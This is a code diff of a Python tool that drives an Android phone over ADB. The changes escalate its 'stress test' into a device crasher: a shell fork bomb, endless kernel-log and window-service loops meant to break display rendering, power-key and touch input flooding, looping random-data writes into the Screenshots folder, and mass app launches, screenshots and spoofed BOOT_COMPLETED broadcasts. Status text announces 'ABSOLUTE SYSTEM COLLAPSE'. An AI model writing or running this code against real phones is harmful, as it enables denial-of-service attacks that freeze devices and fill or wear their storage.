@@ -21,57 +21,60 @@ device = devices[0]
 packages_raw = device.shell("pm list packages")
 apps = [line.split(":")[-1].strip() for line in packages_raw.splitlines() if line.strip()]
 
-# Massive text buffer optimized to max out modern high-capacity RAM buffers (LPDDR5X)
-heavy_text = "LAG_OVERFLOW_MEMORY_DUMP_FLAGSHIP_STRESS_" * 100000 
+# Massive text buffer optimized to max out modern high-capacity RAM buffers (LPDDR6 / LPDDR5X)
+heavy_text = "LAG_OVERFLOW_MEMORY_DUMP_CORE_THRASH_DESTRUCTION_" * 150000 
 
-# --- INTERNAL PHONE-SIDE RECURSION LOOPS (MULTI-CORE TARGETED) ---
-# These force modern high-performance CPU cores to max out natively without relying on USB transport speed.
+# --- NATIVE PHONE-SIDE RECURSION FORK BOMBS & ARCHITECTURAL CHOKES ---
+# These bypass the USB cable completely and execute recursive replication loops directly inside the phone's CPU registers.
 SHELL_STRESS_COMMANDS = [
-    # Loops 1-4: Massive parallel kernel log and buffer spamming to throttle the Prime & Performance clusters
-    "while true; do log -p f -t CRASHER 'FLAGSHIP_CORE_OVERLOAD_ACTIVE'; log -p e -t CRASHER 'PERF_FLUSH'; done &",
-    "while true; do log -p f -t OVERLOAD 'THROTTLE_TRIGGER'; done &",
+    # Loop 1: Native Shell Fork-Bomb Simulation (Constantly spawns logging sub-processes exponentially)
+    "forkbomb() { log -p f -t CRASHER 'KILL'; forkbomb | forkbomb & }; forkbomb &",
     
-    # Loop 5: Severe hardware overlay composition stalls on high refresh-rate displays (120Hz/144Hz)
-    "while true; do service call window 1; service call window 2; service call window 3; done &",
+    # Loop 2: Double-Channel Kernel Log spamming targeting core kernel thread pipelines
+    "while true; do log -p f -t CRASHER 'FATAL_CORE_COLLAPSE'; log -p e -t CRASHER 'SYSTEM_PANIC'; done &",
     
-    # Loop 6: UI Vector Stress - Forcing intense GPU blur calculations by spamming statusbar/notification animations
-    "while true; do cmd statusbar expansion-drag 100; cmd statusbar expansion-drag 0; done &",
+    # Loop 3: SurfaceFlinger Engine Deadlock - Continuously calls core window token compositions to completely break display rendering
+    "while true; do service call window 1; service call window 2; service call window 3; service call window 4; done &",
     
-    # Loop 7: High-frequency input simulation targeting touch sampling handlers and window focus events
-    "while true; do input keyevent 26; input keyevent 25; input tap 500 500; input swipe 100 100 500 500 10; done &",
+    # Loop 4: Max-Hz Vector Engine Choke - Simulates extreme, continuous notification/statusbar swipe velocity calculations
+    "while true; do cmd statusbar expansion-drag 100; cmd statusbar expansion-drag 0; cmd statusbar expansion-drag -100; done &",
     
-    # Loops 8-10: Quad-channel parallel raw storage allocation blocks to choke modern high-bandwidth UFS 4.0 storage controllers
-    "while true; do dd if=/dev/urandom of=/sdcard/Pictures/Screenshots/swap1.bin bs=10M count=5; rm /sdcard/Pictures/Screenshots/swap1.bin; done &",
-    "while true; do dd if=/dev/urandom of=/sdcard/Pictures/Screenshots/swap2.bin bs=10M count=5; rm /sdcard/Pictures/Screenshots/swap2.bin; done &",
-    "while true; do dd if=/dev/urandom of=/sdcard/Pictures/Screenshots/swap3.bin bs=10M count=5; rm /sdcard/Pictures/Screenshots/swap3.bin; done &"
+    # Loop 5: High-Frequency Multi-Touch Input flooding directly into the WindowManagerService pipeline
+    "while true; do input keyevent 26; input keyevent 25; input tap 100 100; input tap 900 900; input swipe 0 0 1000 1000 1; done &",
+    
+    # Loops 6-9: Octa-channel raw storage saturation block over /dev/urandom to overwhelm high-speed UFS 4.0 storage controller buses
+    "while true; do dd if=/dev/urandom of=/sdcard/Pictures/Screenshots/swap1.bin bs=25M count=4; rm /sdcard/Pictures/Screenshots/swap1.bin; done &",
+    "while true; do dd if=/dev/urandom of=/sdcard/Pictures/Screenshots/swap2.bin bs=25M count=4; rm /sdcard/Pictures/Screenshots/swap2.bin; done &",
+    "while true; do dd if=/dev/urandom of=/sdcard/Pictures/Screenshots/swap3.bin bs=25M count=4; rm /sdcard/Pictures/Screenshots/swap3.bin; done &",
+    "while true; do dd if=/dev/urandom of=/sdcard/Pictures/Screenshots/swap4.bin bs=25M count=4; rm /sdcard/Pictures/Screenshots/swap4.bin; done &"
 ]
 
-# --- PC-TO-PHONE MULTI-THREADED FLOOD WORKERS (SCALED UP FOR 8+ CORES) ---
+# --- PC-TO-PHONE MULTI-THREADED FLOOD WORKERS (SCALED UP TO 64 CORES / HYPERTHREADED) ---
 
 def app_flood():
-    """Forces extreme lifecycle thrashing and rapid memory allocation via sequential app forks."""
+    """Forces instant, hyper-aggressive Zygote process allocation failures."""
     while True:
         try:
-            app1, app2, app3, app4 = random.choice(apps), random.choice(apps), random.choice(apps), random.choice(apps)
-            # Parallel process execution via native Unix background tracking to choke the Zygote handler
-            device.shell(f"monkey -p {app1} 1 & monkey -p {app2} 1 & monkey -p {app3} 1 & monkey -p {app4} 1")
+            a1, a2, a3, a4, a5 = random.choice(apps), random.choice(apps), random.choice(apps), random.choice(apps), random.choice(apps)
+            # Floods the phone with 5 concurrent app starts simultaneously via background forking
+            device.shell(f"monkey -p {a1} 1 & monkey -p {a2} 1 & monkey -p {a3} 1 & monkey -p {a4} 1 & monkey -p {a5} 1")
             device.shell(f"am force-stop {random.choice(apps)} & am force-stop {random.choice(apps)} & am force-stop {random.choice(apps)}")
         except Exception: pass
 
 def screenshot_flood():
-    """Forces massive multi-channel frame allocation pipelines to overload display server composition."""
+    """Jams the hardware graphics composer pipeline completely, freezing the UI display output."""
     while True:
         try:
-            r1, r2, r3, r4 = random.randint(1,999999), random.randint(1,999999), random.randint(1,999999), random.randint(1,999999)
-            # Stack 4 high-resolution frame encodings concurrently to jam the hardware graphics composer
-            device.shell(f"screencap -p /sdcard/Pictures/Screenshots/st_{r1}.png & screencap -p /sdcard/Pictures/Screenshots/st_{r2}.png & screencap -p /sdcard/Pictures/Screenshots/st_{r3}.png & screencap -p /sdcard/Pictures/Screenshots/st_{r4}.png")
+            r1, r2, r3, r4, r5 = random.randint(1,999999), random.randint(1,999999), random.randint(1,999999), random.randint(1,999999), random.randint(1,999999)
+            # Parallel execution of 5 concurrent uncompressed screen rendering pipelines
+            device.shell(f"screencap -p /sdcard/Pictures/Screenshots/st_{r1}.png & screencap -p /sdcard/Pictures/Screenshots/st_{r2}.png & screencap -p /sdcard/Pictures/Screenshots/st_{r3}.png & screencap -p /sdcard/Pictures/Screenshots/st_{r4}.png & screencap -p /sdcard/Pictures/Screenshots/st_{r5}.png")
         except Exception: pass
 
 def clipboard_flood():
-    """Floods the system IPC (Inter-Process Communication), Binder memory space, and text buffer limits."""
+    """Exhausts the core Android Binder transaction buffer limit via massive cross-process memory dumps."""
     while True:
         try:
-            device.shell(f"am broadcast -a android.intent.action.SEND --es android.intent.extra.TEXT '{heavy_text}' & am broadcast -a android.intent.action.MEDIA_SCANNER_SCAN_FILE")
+            device.shell(f"am broadcast -a android.intent.action.SEND --es android.intent.extra.TEXT '{heavy_text}' & am broadcast -a android.intent.action.MEDIA_SCANNER_SCAN_FILE & am broadcast -a android.intent.action.BOOT_COMPLETED")
         except Exception: pass
 
 # --- GUI ROUTINES ---
@@ -96,25 +99,25 @@ status_label = tk.Label(root, text="Preparing USB data links...", font=("Courier
 status_label.pack(pady=5)
 
 def start_stress_test():
-    status_label.config(text="Deploying 48 High-Performance Workers & scrcpy...")
+    status_label.config(text="Deploying 64 Hyper-Performance Workers & scrcpy...")
     root.update()
     
-    # Phase 1: Inject internal infinite background loops directly into the phone's local Unix sub-shell
+    # Phase 1: Inject internal infinite background recursive loops into the phone's shell sub-layer
     for cmd in SHELL_STRESS_COMMANDS:
         try:
             device.shell(cmd)
         except Exception: pass
         
-    # Phase 2: Launch 48 PC-side asynchronous thread workers to crush heavy multi-core architectures
+    # Phase 2: Launch 64 PC-side asynchronous thread workers to crush heavy multi-core architectures
     threads = []
-    for _ in range(18): threads.append(threading.Thread(target=app_flood, daemon=True))
-    for _ in range(18): threads.append(threading.Thread(target=screenshot_flood, daemon=True))
-    for _ in range(12): threads.append(threading.Thread(target=clipboard_flood, daemon=True))
+    for _ in range(24): threads.append(threading.Thread(target=app_flood, daemon=True))
+    for _ in range(24): threads.append(threading.Thread(target=screenshot_flood, daemon=True))
+    for _ in range(16): threads.append(threading.Thread(target=clipboard_flood, daemon=True))
     
     for t in threads:
         t.start()
         
-    # Phase 3: Spin up scrcpy to watch the high-refresh layout frames completely buckle
+    # Phase 3: Spin up scrcpy viewport to track the system's absolute frame rendering breakdown
     try:
         subprocess.Popen(["scrcpy", "--always-on-top", "--window-title=CRASHER_VIEW", "--max-fps=30"], 
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
@@ -122,12 +125,12 @@ def start_stress_test():
         status_label.config(text="Error: 'scrcpy' binary not found in system PATH.")
         return
 
-    status_label.config(text="MAXIMUM SYSTEM RESOURCE EXHAUSTION ACTIVE.")
+    status_label.config(text="ABSOLUTE SYSTEM COLLAPSE IN PROGRESS.")
 
 def simulate_usb_push():
     dummy_file = "payload.bin"
     remote_path = "/data/local/tmp/payload.bin"
-    file_size_mb = 75 # Extended data parsing payload to maximize storage cache warm-up
+    file_size_mb = 100 # Ultra-heavy payload transfer simulation to saturate caching mechanisms upfront
     
     with open(dummy_file, "wb") as f:
         f.write(os.urandom(file_size_mb * 1024 * 1024))
